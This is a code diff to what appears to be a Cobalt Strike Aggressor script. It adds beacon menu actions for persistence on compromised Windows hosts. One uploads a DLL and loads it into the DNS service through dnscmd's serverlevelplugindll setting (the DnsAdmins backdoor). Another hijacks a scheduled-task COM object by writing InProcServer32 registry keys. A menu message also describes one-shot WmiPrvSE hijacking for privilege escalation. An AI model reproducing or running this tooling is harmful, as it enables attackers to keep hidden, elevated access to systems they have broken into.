@@ -119,6 +119,49 @@ sub msdtc{
 	dialog_show($dialog);
 }
 
+sub dnsadminrun{
+	println($3);
+	$dll = split("\\\\", $3['dllpath'])[-1];
+	$dllname = $3['uploadpath']."raj.dll";
+	println($3['uploadpath']."raj.dll");
+	bupload!($3['bid'], $3['dllpath']);
+	bmv!($3['bid'], $dll, $dllname);
+	bshell!($3['bid'], "dnscmd /config /serverlevelplugindll ".$dllname);
+	bshell!($3['bid'], "sc stop dns");
+	bshell!($3['bid'], "sc start dns");
+}
+
+sub dnsadmin_config{
+	foreach $id ($bid){
+		$dialog = dialog("DnsAdminConfig", %(uploadpath => "C:\\Windows\\System32\\", bid => $id), &dnsadminrun);
+		dialog_description($dialog, "DnsAdmins权限维持");
+		drow_text($dialog, "uploadpath", "uploadpath:");
+		drow_file($dialog, "dllpath", "dllpath:" );
+		dbutton_action($dialog, "run");
+		dialog_show($dialog);
+	}
+}
+
+sub CacheTaskExec{
+	btask($3['bid'], "CacheTask任务计划COM接口DLL劫持");
+	$dllname = split("\\\\", $3['dllpath'])[-1];
+	bupload!($3['bid'], $3['dllpath']);
+	bmv!($3['bid'], $dllname, $3['uploadpath']);
+	bshell!($3['bid'], "reg add \"HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /ve /t REG_SZ /d $3['uploadpath']");
+	bshell!($3['bid'], "reg add \"HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /v ThreadingModel /t REG_SZ /d Both")
+}
+
+sub CacheTask{
+	foreach $id ($bid){
+		$dialog = dialog("CacheTask", %(uploadpath => "C:\\Windows\\Temp\\test.dll", bid => $id), &CacheTaskExec);
+		dialog_description($dialog, "CacheTask任务计划COM接口DLL劫持,适用系统:Windows 10/Windows Server 2012或以上");
+		drow_text($dialog, "uploadpath", "uploadpath:");
+		drow_file($dialog, "dllpath", "dllpath:");
+		dbutton_action($dialog, "run");
+		dialog_show($dialog);
+	}
+}
+
 
 popup beacon_bottom{
 	menu "&权限维持"{
@@ -145,11 +188,20 @@ popup beacon_bottom{
 			msdtc($bid);
 
 		}
+		
+		item "&dnsadmin后门"{
+			$bid = $1;
+			dnsadmin_config($bid);
+		}
 
 
 		item "&WmiPrvSE劫持"{
 			show_message("WmiPrvSE提权机会只有一次，失败就没了。一般系统运行只有一个WmiPrvSE.exe进程，当有超过一个WmiPrvSE.exe进程存在时。无法提权");
 			WmiPrvSE_config($bid);
+		}
+		
+		item "&CacheTask任务计划COM接口劫持"{
+			CacheTask($bid);
 		}
 
 	}
